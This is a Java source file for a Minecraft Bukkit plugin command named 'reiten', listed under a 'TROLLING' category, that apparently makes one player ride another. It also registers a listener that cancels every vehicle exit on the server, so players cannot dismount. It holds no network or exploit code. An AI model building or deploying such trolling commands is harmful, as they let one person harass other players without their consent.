package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.vehicle.VehicleExitEvent;

public class Command_REITEN extends CommandBase implements Listener {

    public Command_REITEN() {
        super("reiten", "<Spieler> <Spieler>", Category.TROLLING);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    @EventHandler
    public void onVehicleExit(VehicleExitEvent e) {
        e.setCancelled(true);
    }

    public void execute(String[] args, Player p) {
        try {
            if (args.length == 3) {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_REITEN2(this, args, p));
            }
        } catch (Exception var4) {
            var4.printStackTrace();
        }
    }

}
